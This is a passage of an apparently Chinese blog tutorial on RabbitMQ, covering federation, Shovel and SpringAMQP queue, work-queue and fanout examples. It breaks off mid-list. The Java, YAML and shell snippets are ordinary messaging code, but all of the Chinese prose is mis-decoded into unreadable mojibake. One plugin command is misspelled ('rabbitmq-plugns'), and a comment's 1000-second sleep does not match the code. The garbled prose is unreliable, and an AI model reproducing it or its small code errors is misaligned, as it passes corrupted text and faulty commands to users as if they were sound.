src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161826128.png" alt="image-20230113161826128" /></p><blockquote><p>æ­å»ºæ­¥éª¤</p></blockquote><ol><li><p>éœ€è¦ä¿è¯æ¯å°èŠ‚ç‚¹å•ç‹¬è¿è¡Œ</p></li><li><p>åœ¨æ¯å°æœºå™¨ä¸Šå¼€å¯federationç›¸å…³æ’ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æ¯å°èŠ‚ç‚¹å‡éœ€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span><br>rabbitmq-plugins enable rabbitmq_federation<br>rabbitmq-plugns enable rabbitmq_federation_management<br></code></pre></td></tr></table></figure></li><li><p>åŸç†å›¾</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161854512.png" alt="image-20230113161854512" /></p></li><li><p>åœ¨ä¸‹æ¸¸èŠ‚ç‚¹ï¼ˆnode2ï¼‰é…ç½®ä¸Šæ¸¸èŠ‚ç‚¹ï¼ˆnode1ï¼‰</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161909762.png" alt="image-20230113161909762" /></p><p>â€‹</p></li><li><p>æ·»åŠ policy</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161933222.png" alt="image-20230113161933222" /></p></li><li><p>æˆåŠŸ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161940946.png" alt="image-20230113161940946" /></p></li></ol><h2 id="115-federation-queue"><a class="markdownIt-Anchor" href="#115-federation-queue"></a> 11.5 Federation Queue</h2><blockquote><p>ä½¿ç”¨åŸå› </p></blockquote><p>è”é‚¦é˜Ÿåˆ—å¯ä»¥åœ¨å¤šä¸ªBrokerèŠ‚ç‚¹(æˆ–è€…é›†ç¾¤)ä¹‹é—´ä¸ºå•ä¸ªé˜Ÿåˆ—æä¾›å‡è¡¡è´Ÿè½½çš„åŠŸèƒ½ã€‚ä¸€ä¸ªè”é‚¦é˜Ÿåˆ—å¯ä»¥è¿æ¥ä¸€ä¸ªæˆ–è€…å¤šä¸ªä¸Šæ¸¸é˜Ÿåˆ—(upstream queue)ï¼Œå¹¶ä»è¿™äº›ä¸Šæ¸¸é˜Ÿåˆ—ä¸­è·å–æ¶ˆæ¯ä»¥æ»¡è¶³æœ¬åœ°æ¶ˆè´¹è€…æ¶ˆè´¹æ¶ˆæ¯çš„éœ€æ±‚ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161958144.png" alt="image-20230113161958144" /></p><ol><li><p>æ·»åŠ ä¸Šä¸‹æ¸¸é…ç½®ï¼ˆåŒ11.4ï¼‰</p></li><li><p>æ·»åŠ policy</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113162007236.png" alt="image-20230113162007236" /></p></li></ol><h2 id="116-shovel"><a class="markdownIt-Anchor" href="#116-shovel"></a> 11.6 Shovel</h2><blockquote><p>ä½¿ç”¨åŸå› </p></blockquote><p>Federationå…·å¤‡çš„æ•°æ®è½¬å‘åŠŸèƒ½ç±»ä¼¼ï¼ŒShovelå¤Ÿå¯é ã€æŒç»­åœ°ä»ä¸€ä¸ªBrokerä¸­çš„é˜Ÿåˆ—(ä½œä¸ºæºç«¯ï¼Œå³source)æ‹‰å–æ•°æ®å¹¶è½¬å‘è‡³å¦ä¸€ä¸ªBrokerä¸­çš„äº¤æ¢å™¨(ä½œä¸ºç›®çš„ç«¯ï¼Œå³destination)ã€‚ä½œä¸ºæºç«¯çš„é˜Ÿåˆ—å’Œä½œä¸ºç›®çš„ç«¯çš„äº¤æ¢å™¨å¯ä»¥åŒæ—¶ä½äºåŒä¸€ä¸ªBrokerï¼Œä¹Ÿå¯ä»¥ä½äºä¸åŒçš„Brokerä¸Šã€‚Shovelå¯ä»¥ç¿»è¯‘ä¸º&quot;é“²å­&quot;,æ˜¯ä¸€ç§æ¯”è¾ƒå½¢è±¡çš„æ¯”å–»ï¼Œè¿™ä¸ª&quot;é“²å­&quot;å¯ä»¥å°†æ¶ˆæ¯ä»ä¸€æ–¹&quot;é“²å­&quot;å¦ä¸€æ–¹ã€‚Shovelè¡Œä¸ºå°±åƒä¼˜ç§€çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºèƒ½å¤Ÿè´Ÿè´£è¿æ¥æºå’Œç›®çš„åœ°ã€è´Ÿè´£æ¶ˆæ¯çš„è¯»å†™åŠè´Ÿè´£è¿æ¥å¤±è´¥é—®é¢˜çš„å¤„ç†ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113162035021.png" alt="image-20230113162035021" /></p><blockquote><p>æ­å»ºæ­¥éª¤</p></blockquote><ol><li><p>å¼€å¯æ’ä»¶ï¼ˆéœ€è¦çš„æœºå™¨éƒ½å¼€å¯ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmq-plugins enable rabbitmq_shovel<br>rabbitmq-plugins enable rabbitmq_shovel_management<br></code></pre></td></tr></table></figure></li><li><p>æ·»åŠ shevelæºå’Œç›®çš„åœ°</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113162046992.png" alt="image-20230113162046992" /></p></li></ol><h1 id="12-springamqp"><a class="markdownIt-Anchor" href="#12-springamqp"></a> 12. SpringAMQP</h1><p>SpringAMQPæ˜¯åŸºäºRabbitMQå°è£…çš„ä¸€å¥—æ¨¡æ¿ï¼Œå¹¶ä¸”è¿˜åˆ©ç”¨SpringBootå¯¹å…¶å®ç°äº†è‡ªåŠ¨è£…é…ï¼Œä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚</p><p>SpringAmqpçš„å®˜æ–¹åœ°å€ï¼š<a href="https://spring.io/projects/spring-amqp">https://spring.io/projects/spring-amqp</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457950.png" alt="image-20210717164024967" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457951.png" alt="image-20210717164038678" /></p><p>SpringAMQPæä¾›äº†ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ul><li>è‡ªåŠ¨å£°æ˜é˜Ÿåˆ—ã€äº¤æ¢æœºåŠå…¶ç»‘å®šå…³ç³»</li><li>åŸºäºæ³¨è§£çš„ç›‘å¬å™¨æ¨¡å¼ï¼Œå¼‚æ­¥æ¥æ”¶æ¶ˆæ¯</li><li>å°è£…äº†RabbitTemplateå·¥å…·ï¼Œç”¨äºå‘é€æ¶ˆæ¯</li></ul><h2 id="121basic-queue-ç®€å•é˜Ÿåˆ—æ¨¡å‹"><a class="markdownIt-Anchor" href="#121basic-queue-ç®€å•é˜Ÿåˆ—æ¨¡å‹"></a> 12.1.Basic Queue ç®€å•é˜Ÿåˆ—æ¨¡å‹</h2><p>åœ¨çˆ¶å·¥ç¨‹mq-demoä¸­å¼•å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--AMQPä¾èµ–ï¼ŒåŒ…å«RabbitMQ--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1211æ¶ˆæ¯å‘é€"><a class="markdownIt-Anchor" href="#1211æ¶ˆæ¯å‘é€"></a> 12.1.1.æ¶ˆæ¯å‘é€</h3><p>é¦–å…ˆé…ç½®MQåœ°å€ï¼Œåœ¨publisheræœåŠ¡çš„application.ymlä¸­æ·»åŠ é…ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.123</span><span class="hljs-number">.128</span> <span class="hljs-comment"># ä¸»æœºå</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span> <span class="hljs-comment"># ç«¯å£</span><br>    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span> <span class="hljs-comment"># è™šæ‹Ÿä¸»æœº</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">RabbitMQ</span> <span class="hljs-comment"># ç”¨æˆ·å</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">RabbitMQ</span> <span class="hljs-comment"># å¯†ç </span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨publisheræœåŠ¡ä¸­ç¼–å†™æµ‹è¯•ç±»SpringAmqpTestï¼Œå¹¶åˆ©ç”¨RabbitTemplateå®ç°æ¶ˆæ¯å‘é€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.mq.spring;<br><br><span class="hljs-keyword">import</span> org.junit.Test;<br><span class="hljs-keyword">import</span> org.junit.runner.RunWith;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><span class="hljs-keyword">import</span> org.springframework.test.context.junit4.SpringRunner;<br><br><span class="hljs-meta">@RunWith(SpringRunner.class)</span><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringAmqpTest</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSimpleQueue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;simple.queue&quot;</span>;<br>        <span class="hljs-comment">// æ¶ˆæ¯</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello, spring amqp!&quot;</span>;<br>        <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span><br>        rabbitTemplate.convertAndSend(queueName, message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1212æ¶ˆæ¯æ¥æ”¶"><a class="markdownIt-Anchor" href="#1212æ¶ˆæ¯æ¥æ”¶"></a> 12.1.2.æ¶ˆæ¯æ¥æ”¶</h3><p>é¦–å…ˆé…ç½®MQåœ°å€ï¼Œåœ¨consumeræœåŠ¡çš„application.ymlä¸­æ·»åŠ é…ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.101</span> <span class="hljs-comment"># ä¸»æœºå</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span> <span class="hljs-comment"># ç«¯å£</span><br>    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span> <span class="hljs-comment"># è™šæ‹Ÿä¸»æœº</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">itcast</span> <span class="hljs-comment"># ç”¨æˆ·å</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123321</span> <span class="hljs-comment"># å¯†ç </span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨consumeræœåŠ¡çš„<code>cn.itcast.mq.listener</code>åŒ…ä¸­æ–°å»ºä¸€ä¸ªç±»SpringRabbitListenerï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.mq.listener;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRabbitListener</span> &#123;<br><br>    <span class="hljs-meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenSimpleQueueMessage</span><span class="hljs-params">(String msg)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        System.out.println(<span class="hljs-string">&quot;spring æ¶ˆè´¹è€…æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1213æµ‹è¯•"><a class="markdownIt-Anchor" href="#1213æµ‹è¯•"></a> 12.1.3.æµ‹è¯•</h3><p>å¯åŠ¨consumeræœåŠ¡ï¼Œç„¶ååœ¨publisheræœåŠ¡ä¸­è¿è¡Œæµ‹è¯•ä»£ç ï¼Œå‘é€MQæ¶ˆæ¯</p><h2 id="122workqueue"><a class="markdownIt-Anchor" href="#122workqueue"></a> 12.2.WorkQueue</h2><p>Work queuesï¼Œä¹Ÿè¢«ç§°ä¸ºï¼ˆTask queuesï¼‰ï¼Œä»»åŠ¡æ¨¡å‹ã€‚ç®€å•æ¥è¯´å°±æ˜¯<strong>è®©å¤šä¸ªæ¶ˆè´¹è€…ç»‘å®šåˆ°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå…±åŒæ¶ˆè´¹é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯</strong>ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457952.png" alt="image-20210717164238910" /></p><p>å½“æ¶ˆæ¯å¤„ç†æ¯”è¾ƒè€—æ—¶çš„æ—¶å€™ï¼Œå¯èƒ½ç”Ÿäº§æ¶ˆæ¯çš„é€Ÿåº¦ä¼šè¿œè¿œå¤§äºæ¶ˆæ¯çš„æ¶ˆè´¹é€Ÿåº¦ã€‚é•¿æ­¤ä»¥å¾€ï¼Œæ¶ˆæ¯å°±ä¼šå †ç§¯è¶Šæ¥è¶Šå¤šï¼Œæ— æ³•åŠæ—¶å¤„ç†ã€‚</p><p>æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨work æ¨¡å‹ï¼Œå¤šä¸ªæ¶ˆè´¹è€…å…±åŒå¤„ç†æ¶ˆæ¯å¤„ç†ï¼Œé€Ÿåº¦å°±èƒ½å¤§å¤§æé«˜äº†ã€‚</p><h3 id="1221æ¶ˆæ¯å‘é€"><a class="markdownIt-Anchor" href="#1221æ¶ˆæ¯å‘é€"></a> 12.2.1.æ¶ˆæ¯å‘é€</h3><p>è¿™æ¬¡æˆ‘ä»¬å¾ªç¯å‘é€ï¼Œæ¨¡æ‹Ÿå¤§é‡æ¶ˆæ¯å †ç§¯ç°è±¡ã€‚</p><p>åœ¨publisheræœåŠ¡ä¸­çš„SpringAmqpTestç±»ä¸­æ·»åŠ ä¸€ä¸ªæµ‹è¯•æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * workQueue</span><br><span class="hljs-comment">     * å‘é˜Ÿåˆ—ä¸­ä¸åœå‘é€æ¶ˆæ¯ï¼Œæ¨¡æ‹Ÿæ¶ˆæ¯å †ç§¯ã€‚</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWorkQueue</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;simple.queue&quot;</span>;<br>    <span class="hljs-comment">// æ¶ˆæ¯</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello, message_&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<br>        <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span><br>        rabbitTemplate.convertAndSend(queueName, message + i);<br>        Thread.sleep(<span class="hljs-number">20</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1222æ¶ˆæ¯æ¥æ”¶"><a class="markdownIt-Anchor" href="#1222æ¶ˆæ¯æ¥æ”¶"></a> 12.2.2.æ¶ˆæ¯æ¥æ”¶</h3><p>è¦æ¨¡æ‹Ÿå¤šä¸ªæ¶ˆè´¹è€…ç»‘å®šåŒä¸€ä¸ªé˜Ÿåˆ—ï¼Œæˆ‘ä»¬åœ¨consumeræœåŠ¡çš„SpringRabbitListenerä¸­æ·»åŠ 2ä¸ªæ–°çš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenWorkQueue1</span><span class="hljs-params">(String msg)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    System.out.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…1æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span> + LocalTime.now());<br>    Thread.sleep(<span class="hljs-number">20</span>);<br>&#125;<br><br><span class="hljs-meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listenWorkQueue2</span><span class="hljs-params">(String msg)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>    System.err.println(<span class="hljs-string">&quot;æ¶ˆè´¹è€…2........æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€&quot;</span> + msg + <span class="hljs-string">&quot;ã€‘&quot;</span> + LocalTime.now());<br>    Thread.sleep(<span class="hljs-number">200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°è¿™ä¸ªæ¶ˆè´¹è€…sleepäº†1000ç§’ï¼Œæ¨¡æ‹Ÿä»»åŠ¡è€—æ—¶ã€‚</p><h3 id="1223æµ‹è¯•"><a class="markdownIt-Anchor" href="#1223æµ‹è¯•"></a> 12.2.3.æµ‹è¯•</h3><p>å¯åŠ¨ConsumerApplicationåï¼Œåœ¨æ‰§è¡ŒpublisheræœåŠ¡ä¸­åˆšåˆšç¼–å†™çš„å‘é€æµ‹è¯•æ–¹æ³•testWorkQueueã€‚</p><p>å¯ä»¥çœ‹åˆ°æ¶ˆè´¹è€…1å¾ˆå¿«å®Œæˆäº†è‡ªå·±çš„25æ¡æ¶ˆæ¯ã€‚æ¶ˆè´¹è€…2å´åœ¨ç¼“æ…¢çš„å¤„ç†è‡ªå·±çš„25æ¡æ¶ˆæ¯ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æ¶ˆæ¯æ˜¯å¹³å‡åˆ†é…ç»™æ¯ä¸ªæ¶ˆè´¹è€…ï¼Œå¹¶æ²¡æœ‰è€ƒè™‘åˆ°æ¶ˆè´¹è€…çš„å¤„ç†èƒ½åŠ›ã€‚è¿™æ ·æ˜¾ç„¶æ˜¯æœ‰é—®é¢˜çš„ã€‚</p><h3 id="1224èƒ½è€…å¤šåŠ³"><a class="markdownIt-Anchor" href="#1224èƒ½è€…å¤šåŠ³"></a> 12.2.4.èƒ½è€…å¤šåŠ³</h3><p>åœ¨springä¸­æœ‰ä¸€ä¸ªç®€å•çš„é…ç½®ï¼Œå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬ä¿®æ”¹consumeræœåŠ¡çš„application.ymlæ–‡ä»¶ï¼Œæ·»åŠ é…ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">listener:</span><br>      <span class="hljs-attr">simple:</span><br>        <span class="hljs-attr">prefetch:</span> <span class="hljs-number">1</span> <span class="hljs-comment"># æ¯æ¬¡åªèƒ½è·å–ä¸€æ¡æ¶ˆæ¯ï¼Œå¤„ç†å®Œæˆæ‰èƒ½è·å–ä¸‹ä¸€ä¸ªæ¶ˆæ¯</span><br></code></pre></td></tr></table></figure><h3 id="1225æ€»ç»“"><a class="markdownIt-Anchor" href="#1225æ€»ç»“"></a> 12.2.5.æ€»ç»“</h3><p>Workæ¨¡å‹çš„ä½¿ç”¨ï¼š</p><ul><li>å¤šä¸ªæ¶ˆè´¹è€…ç»‘å®šåˆ°ä¸€ä¸ªé˜Ÿåˆ—ï¼ŒåŒä¸€æ¡æ¶ˆæ¯åªä¼šè¢«ä¸€ä¸ªæ¶ˆè´¹è€…å¤„ç†</li><li>é€šè¿‡è®¾ç½®prefetchæ¥æ§åˆ¶æ¶ˆè´¹è€…é¢„å–çš„æ¶ˆæ¯æ•°é‡</li></ul><h2 id="123å‘å¸ƒè®¢é˜…"><a class="markdownIt-Anchor" href="#123å‘å¸ƒè®¢é˜…"></a> 12.3.å‘å¸ƒ/è®¢é˜…</h2><p>å‘å¸ƒè®¢é˜…çš„æ¨¡å‹å¦‚å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457953.png" alt="image-20210717165309625" /></p><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è®¢é˜…æ¨¡å‹ä¸­ï¼Œå¤šäº†ä¸€ä¸ªexchangeè§’è‰²ï¼Œè€Œä¸”è¿‡ç¨‹ç•¥æœ‰å˜åŒ–ï¼š</p><ul><li>Publisherï¼šç”Ÿäº§è€…ï¼Œä¹Ÿå°±æ˜¯è¦å‘é€æ¶ˆæ¯çš„ç¨‹åºï¼Œä½†æ˜¯ä¸å†å‘é€åˆ°é˜Ÿåˆ—ä¸­ï¼Œè€Œæ˜¯å‘ç»™Xï¼ˆäº¤æ¢æœºï¼‰</li><li>Exchangeï¼šäº¤æ¢æœºï¼Œå›¾ä¸­çš„Xã€‚ä¸€æ–¹é¢ï¼Œæ¥æ”¶ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ã€‚å¦ä¸€æ–¹é¢ï¼ŒçŸ¥é“å¦‚ä½•å¤„ç†æ¶ˆæ¯ï¼Œä¾‹å¦‚é€’äº¤ç»™æŸä¸ªç‰¹åˆ«é˜Ÿåˆ—ã€é€’äº¤ç»™æ‰€æœ‰é˜Ÿåˆ—ã€æˆ–æ˜¯å°†æ¶ˆæ¯ä¸¢å¼ƒã€‚åˆ°åº•å¦‚ä½•æ“ä½œï¼Œå–å†³äºExchangeçš„ç±»å‹ã€‚Exchangeæœ‰ä»¥ä¸‹3ç§ç±»å‹ï¼š<ul><li>Fanoutï¼šå¹¿æ’­ï¼Œå°†æ¶ˆæ¯äº¤ç»™æ‰€æœ‰ç»‘å®šåˆ°äº¤æ¢æœºçš„é˜Ÿåˆ—</li><li>Directï¼šå®šå‘ï¼ŒæŠŠæ¶ˆæ¯äº¤ç»™ç¬¦åˆæŒ‡å®šrouting key çš„é˜Ÿåˆ—</li><li>Topicï¼šé€šé…ç¬¦ï¼ŒæŠŠæ¶ˆæ¯äº¤ç»™ç¬¦åˆrouting patternï¼ˆè·¯ç”±æ¨¡å¼ï¼‰ çš„é˜Ÿåˆ—</li></ul></li><li>Consumerï¼šæ¶ˆè´¹è€…ï¼Œä¸ä»¥å‰ä¸€æ ·ï¼Œè®¢é˜…é˜Ÿåˆ—ï¼Œæ²¡æœ‰å˜åŒ–</li><li>Queueï¼šæ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿä¸ä»¥å‰ä¸€æ ·ï¼Œæ¥æ”¶æ¶ˆæ¯ã€ç¼“å­˜æ¶ˆæ¯ã€‚</li></ul><p><strong>Exchangeï¼ˆäº¤æ¢æœºï¼‰åªè´Ÿè´£è½¬å‘æ¶ˆæ¯ï¼Œä¸å…·å¤‡å­˜å‚¨æ¶ˆæ¯çš„èƒ½åŠ›</strong>ï¼Œå› æ­¤å¦‚æœæ²¡æœ‰ä»»ä½•é˜Ÿåˆ—ä¸Exchangeç»‘å®šï¼Œæˆ–è€…æ²¡æœ‰ç¬¦åˆè·¯ç”±è§„åˆ™çš„é˜Ÿåˆ—ï¼Œé‚£ä¹ˆæ¶ˆæ¯ä¼šä¸¢å¤±ï¼</p><h2 id="124fanout"><a class="markdownIt-Anchor" href="#124fanout"></a> 12.4.Fanout</h2><p>Fanoutï¼Œè‹±æ–‡ç¿»è¯‘æ˜¯æ‰‡å‡ºï¼Œæˆ‘è§‰å¾—åœ¨MQä¸­å«å¹¿æ’­æ›´åˆé€‚ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261457954.png" alt="image-20210717165438225" /></p><p>åœ¨å¹¿æ’­æ¨¡å¼ä¸‹ï¼Œæ¶ˆæ¯å‘é€æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><ul><li>1ï¼‰  å¯ä»¥æœ‰å¤šä¸ªé˜Ÿåˆ—</li><li>2ï¼‰  æ¯ä¸ªé˜Ÿåˆ—éƒ½è¦ç»‘å®šåˆ°Exchangeï¼ˆäº¤æ¢æœºï¼‰</li><li>3ï¼‰  ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ï¼Œåªèƒ½å‘é€åˆ°äº¤æ¢æœºï¼Œäº¤æ¢æœºæ¥å†³å®šè¦å‘ç»™å“ªä¸ªé˜Ÿåˆ—ï¼Œç”Ÿäº§è€…æ— æ³•å†³å®š</li><li>4ï¼‰  äº¤æ¢æœºæŠŠæ¶ˆæ¯å‘é€ç»™ç»‘å®šè¿‡çš„æ‰€æœ‰é˜Ÿåˆ—</li><li>5ï¼‰  è®¢é˜…é˜Ÿåˆ—çš„æ¶ˆè´¹è€…éƒ½èƒ½æ‹¿åˆ°æ¶ˆæ¯</li></ul><p>æˆ‘ä»¬çš„è®¡åˆ’æ˜¯è¿™æ ·çš„ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ªäº¤æ¢æœº 